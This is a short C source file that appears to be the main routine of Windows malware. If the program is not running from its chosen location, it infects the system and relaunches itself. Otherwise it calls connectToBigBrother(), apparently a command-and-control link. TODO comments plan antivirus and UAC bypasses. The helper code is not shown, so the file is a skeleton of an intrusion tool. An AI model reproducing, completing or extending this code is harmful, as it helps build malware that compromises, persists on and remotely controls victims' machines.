#include <stdlib.h>

#include "esSCKTBaseDef.h"
#include "helper.h" 

int main(int argc, char *argv[]) // gcc --machine-windows
{
    (void)argc;
    
    if (eaSCKTInit())
    {
        return EXIT_FAILURE;
    }

    //TODO: ByPass AV
    
    //TODO: ByPass UAC

    if (!isThePlaceToBe(argv[0]))
    {
        if (isTheSystemInfected())
        {
            return EXIT_SUCCESS;
        }

        startProgram((const wchar_t *){infectTheSystem()});

        return EXIT_SUCCESS;
    }

    connectToBigBrother();

    eaSCKTFinish();

    return EXIT_SUCCESS;
}
